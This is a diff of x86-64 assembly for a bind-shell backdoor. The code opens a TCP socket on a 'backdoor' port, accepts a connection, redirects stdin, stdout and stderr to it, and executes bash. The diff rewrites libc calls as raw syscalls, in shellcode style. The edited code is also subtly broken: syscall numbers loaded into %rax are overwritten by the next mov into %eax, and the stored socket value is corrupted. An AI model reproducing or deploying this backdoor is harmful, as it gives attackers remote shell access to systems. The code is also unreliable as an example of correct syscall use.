@@ -33,16 +33,16 @@ bash_ptr:
 .global _start
 _start:
 	# dynamic stack alloc. maybe remove
-	pushq	%rbp
-	movq	%rsp, %rbp
+#	pushq	%rbp
+#	movq	%rsp, %rbp
 
-	# TODO FIX: remove  'call' with syscalls
-
+	movq    $SYS_SOCKET, %rax
 	movl	$AF_INET, %edi
 	movl	$SOCK_STREAM, %esi
 	movl	$IPPROTO_TCP, %edx
-	call	socket
+	syscall
 
+	movq	$SYS_BIND, %rax
 	movl	%eax, sock(%rip)
 	movw	$AF_INET, sock_address(%rip)
 	movw	$BACKDOOR_PORT_HTONS, sock_address+SIZEOF_UINT_16_T(%rip)
@@ -50,45 +50,46 @@ _start:
 	movl	$SIZEOF_STRUCT_SOCKADDR, %edx
 	movl	$sock_address, %esi
 	movl	%eax, %edi
-	call	bind
+	syscall
 
+	movq    $SYS_LISTEN, %rax
 	movl	sock(%rip), %eax
 	movl	%eax, %edi
 	movl	$ACCEPTED_CONNECTIONS, %esi
-	call	listen
+	syscall
 
+	movq	$SYS_ACCEPT, %rax
 	movl	sock(%rip), %eax
 	movl	$NULL, %edx
 	movl	$NULL, %esi
 	movl	%eax, %edi
-	call	accept
+	syscall
 
+	movq	$SYS_DUP2, %rax
 	movl	%eax, sock_fd(%rip)
 	movl	sock_fd(%rip), %eax
 	movl	$STDIN, %esi
 	movl	%eax, %edi
-	call	dup2
+	syscall
 
+	movq	$SYS_DUP2, %rax
 	movl	sock_fd(%rip), %eax
 	movl	$STDOUT, %esi
 	movl	%eax, %edi
-	call	dup2
+	syscall
 
+	movq	$SYS_DUP2, %rax
 	movl	sock_fd(%rip), %eax
 	movl	$STDERR, %esi
 	movl	%eax, %edi
-	call	dup2
+	syscall
 
+	movq	$SYS_EXECVE, %rax
 	movq	bash_ptr(%rip), %rax
 	movl	$NULL, %edx
 	movl	$NULL, %esi
 	movq	%rax, %rdi
-	call	execve
-
-	# maybe remoove and use just SYS_EXIT
-	movl	$0, %eax
-	popq	%rbp
-	ret
+	syscall
 
 	movq $SYS_EXIT, %rax
 	movq $0, %rdi
